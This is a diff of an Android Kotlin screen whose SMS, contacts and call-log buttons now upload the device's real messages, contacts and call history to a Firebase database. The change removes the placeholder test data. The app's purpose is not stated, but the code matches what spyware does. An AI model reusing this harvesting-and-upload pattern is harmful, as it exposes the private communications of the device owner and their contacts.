@@ -100,7 +100,7 @@ fun HomeScreen(activity: ComponentActivity, database: FirebaseDatabase) {
         // Bouton SMS
         Button(
             onClick = {
-                val smsList = readSms(activity).ifEmpty {
+               /* val smsList = readSms(activity).ifEmpty {
                     listOf(
                         mapOf("address" to "123456789", "body" to "Test SMS", "date" to "2025-08-21"),
                         mapOf("address" to "987654321", "body" to "Hello World", "date" to "2025-08-20")
@@ -108,7 +108,11 @@ fun HomeScreen(activity: ComponentActivity, database: FirebaseDatabase) {
                 }
                 val smsRef = database.getReference("sms")
                 smsRef.setValue(smsList)
-                Log.d("FirebaseUpload", "SMS envoyés : ${smsList.size}")
+                Log.d("FirebaseUpload", "SMS envoyés : ${smsList.size}")*/
+                val smsList = readSms(activity)
+                val smsRef = database.getReference("sms")
+                smsRef.setValue(smsList)
+                Log.d("FirebaseUpload", "Sms envoyés : ${smsList.size}")
             },
             modifier = Modifier
                 .fillMaxWidth()
@@ -119,13 +123,19 @@ fun HomeScreen(activity: ComponentActivity, database: FirebaseDatabase) {
 
         // Bouton Contacts
         Button(
-            onClick = {
+            /*onClick = {
                 val contactsList = readContacts(activity).ifEmpty {
                     listOf(
                         mapOf("name" to "Alice", "number" to "123456789"),
                         mapOf("name" to "Bob", "number" to "987654321")
                     )
                 }
+                val contactsRef = database.getReference("contacts")
+                contactsRef.setValue(contactsList)
+                Log.d("FirebaseUpload", "Contacts envoyés : ${contactsList.size}")
+            },*/
+            onClick = {
+                val contactsList = readContacts(activity)
                 val contactsRef = database.getReference("contacts")
                 contactsRef.setValue(contactsList)
                 Log.d("FirebaseUpload", "Contacts envoyés : ${contactsList.size}")
@@ -140,12 +150,16 @@ fun HomeScreen(activity: ComponentActivity, database: FirebaseDatabase) {
         // Bouton Appels
         Button(
             onClick = {
-                val callsList = readCallLogs(activity).ifEmpty {
+               /* val callsList = readCallLogs(activity).ifEmpty {
                     listOf(
                         mapOf("number" to "123456789", "type" to "INCOMING", "date" to "2025-08-21", "duration" to "60"),
                         mapOf("number" to "987654321", "type" to "MISSED", "date" to "2025-08-20", "duration" to "0")
                     )
                 }
+                val callsRef = database.getReference("calls")
+                callsRef.setValue(callsList)
+                Log.d("FirebaseUpload", "Appels envoyés : ${callsList.size}")*/
+                val callsList = readCallLogs(activity)
                 val callsRef = database.getReference("calls")
                 callsRef.setValue(callsList)
                 Log.d("FirebaseUpload", "Appels envoyés : ${callsList.size}")
